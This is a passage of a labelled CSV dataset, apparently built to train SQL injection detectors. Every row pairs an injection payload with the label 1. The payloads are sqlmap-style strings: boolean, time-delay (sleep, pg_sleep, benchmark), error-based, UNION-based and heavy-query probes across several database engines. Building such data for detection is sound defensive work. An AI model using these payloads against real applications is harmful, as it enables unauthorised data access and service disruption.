,Sentence,Label
4031,1  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 9548 = 9548,1
4032,1  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  6406 = 6406,1
4033,-5021'+ ( select yadq where 4285 = 4285 order by 1#,1
4034,1%' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = ',1
4035,"1"" )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( ""baia"" = ""baia",1
4036,"1"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""jozh"" = ""jozh",1
4037,"-9508 )  union all select 9950,9950,9950,9950,9950,9950,9950#",1
4038,"1  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
4039,"-1064' or make_set ( 6439 = 2937,2937 )  and 'qojd' = 'qojd",1
4040,1' )  as rbpx where 1264 = 1264,1
4041,"1%'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( '%' = '",1
4042,if ( 8284 = 6171 )  select 8284 else drop function mbih--,1
4043,1  )  )   or sleep ( 5 ) #,1
4044,"-7868""  )  )   or 9323 = 9323#",1
4045,"1' )  as ekjw where 5477 = 5477 union all select null,null,null,null,null--",1
4046,"1"" where 2462 = 2462 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
4047,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'mfib' = 'mfib",1
4048,1  )  )   or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
4049,1%' and 4595 = 4595#,1
4050,1' )  as oknw where 8777 = 8777,1
4051,"1"" where 6501 = 6501",1
4052,"1 )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 8929 = 8929",1
4053,-7999 )  or 8422 = 1336,1
4054,-5742' where 1314 = 1314 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
4055,"1  )  )   as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
4056,"-4605"" )  union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1
4057,"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'njnr' = 'njnr",1
4058,select case when 6558 = 4327 then 1 else null end--,1
4059,-7535 )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1
4060," end and   (  (  ""rqay"" like ""rqay",1
4061,"-2312'  )  )   )  union all select 5282,5282,5282,5282,5282,5282,5282,5282--",1
4062,"1%""  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
4063,select  ( case when  ( 8993 = 8846 )  then 8993 else 8993* ( select 8993 from mysql.db )  end ) #,1
4064,"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( '%' = '",1
4065,"select pg_sleep ( 5 )  and  ( ""%"" = """,1
4066,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  4142 = 4142",1
4067,"-8153' )  as qhlb where 4948 = 4948 union all select 4948,4948,4948,4948,4948,4948#",1
4068,-7319 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
4069,"1'  )  )   as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
4070,"1%"" )  and 2006 = 2006",1
4071,"-5139  )  )   union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1
4072,"1 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",1
4073,"1' )  as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
4074,"1 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",1
4075,-9446  )  )   as wmrq where 3705 = 3705 union all select 3705#,1
4076,"iif ( 7889 = 5114,1,1/0 ) ",1
4077,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and  ( 'ztmd' = 'ztmd",1
4078,"1""  )  )   union all select null,null,null,null,null,null,null,null#",1
4079,"1%'  )  )   and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
4080,"1%' )  and elt ( 4249 = 4249,7259 )  and  ( '%' = '",1
4081,1' )  where 4867 = 4867 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1
4082,if ( 8858 = 5680 )  select 8858 else drop function pyuo--,1
4083,"1  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 1748 = 1748",1
4084,"1""  )  )   as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
4085,-3859 )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 5846 = 5846,1
4086," end and  ( ""qkkn"" like ""qkkn",1
4087,1  )  )   as pzoo where 8036 = 8036 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --,1
4088,-2120' )  or 8734 = 8844#,1
4089,"1""  )  )   as lomw where 9257 = 9257 union all select null,null,null,null,null,null--",1
4090,"1 )  where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
4091,"1'+ ( select syrz where 7699 = 7699 union all select null,null,null#",1
4092,1 )  and 4595 = 4595#,1
4093,"-4984%""  )  )   )  union all select 6980,6980,6980,6980,6980,6980,6980,6980#",1
4094,"-5224' )  where 1962 = 1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1
4095,"1' and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
4096,"1'|| ( select 'gboi' where 4191 = 4191 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  ||'",1
4097,"1""  )  )   )  union all select null,null,null,null,null--",1
4098,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and 'xmnd' = 'xmnd",1
4099,"1'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 'ejul' = 'ejul",1
4100,"-3721' )  union all select 9050,9050--",1
4101,"1"" )  as paai where 4089 = 4089 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
4102,"1""  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
4103,1%' )  order by 1--,1
4104,"-9281 )  where 8363 = 8363 or make_set ( 8220 = 5127,5127 ) --",1
4105,"1"" )  where 6671 = 6671 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
4106," end and  ( ""vwbx"" = ""vwbx",1
4107,"1' in boolean mode )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
4108,1'  )  )   rlike sleep ( 5 )  and   (  (  'iwct' = 'iwct,1
4109,"-9087"" order by 1#",1
4110,-7562 )  or 8571 = 8571--,1
4111,"-3707""  )  )   )  or 8571 = 8571--",1
4112,1'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  +',1
4113,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  ""eevk"" = ""eevk",1
4114,1 )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ,1
4115,"1""  )  )   as vbpl where 3885 = 3885 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --",1
4116,select pg_sleep ( 5 )  and   (  (  'enpn' like 'enpn,1
4117,"1"" )  where 2136 = 2136 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
4118,1' )  where 7629 = 7629 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
4119,1%' )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
4120,select  ( case when  ( 1275 = 7674 )  then 1275 else 1275* ( select 1275 from information_schema.character_sets )  end ) #,1
4121,"1"" )  as duvm where 6190 = 6190 order by 1--",1
4122,-8665' or 6825 = 7840 and 'vbsy' like 'vbsy,1
4123,"1%' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and '%' = '",1
4124,"1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
4125,1'|| ( select 'tfqg' from dual where 9862 = 9862 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
4126,"-7686%"" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
4127,1' )  and  ( 7603 = 3634 ) *3634,1
4128,"1' where 3612 = 3612 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
4129,"1%""  )  )   and 7533 = 7533 and   (  (  ""%"" = """,1
4130,-3834'  )  )   as hhiy where 2086 = 2086 or 3038 = 3038,1
4131,"-7371' )  union all select 4531,4531,4531#",1
4132,select  ( case when  ( 1039 = 5127 )  then 1039 else 1039* ( select 1039 from information_schema.character_sets )  end ) #,1
4133,"1  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 8814 = 8814",1
4134,select case when 1574 = 5523 then 1 else null end--,1
4135,"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) ",1
